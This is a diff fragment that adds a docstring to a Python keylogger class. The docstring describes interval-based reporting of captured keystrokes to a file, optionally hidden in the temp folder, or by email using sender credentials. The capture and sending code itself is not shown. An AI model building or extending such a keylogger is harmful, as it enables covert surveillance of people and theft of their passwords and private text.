@@ -7,6 +7,26 @@ import smtplib, ssl
 from email.message import EmailMessage
 
 class Keylogger:
+    """
+        Create the keylogger and call start() to starting the keylogger. 
+
+        Params details:
+        - interval -> time between every report;
+        - reportMethod -> there are 2 types of report method:
+            - file
+            - email
+        - onlyOneFile -> if reportMethod is file, there will be only one file
+            overwritten every interval;
+        - hiddenPath -> in base of the operating system, if true the keylogger will
+            save the keylogs file in the temp folder (Linux and Windows tested);
+        - emailSender -> if the report method is email, the keylogger uses emailSender
+            as the sender of the email;
+        - passwordSender -> if the report method is email, the keylogger uses passwordSender
+            as the password of the emailSender;
+        - emailReceiver -> if the report method is email, the keylogger uses emailSender
+            as the receiver of the email. If not specified emailReceiver will be equal to
+            emailSender.        
+    """
     def __init__(
         self,
         interval : int = 60,
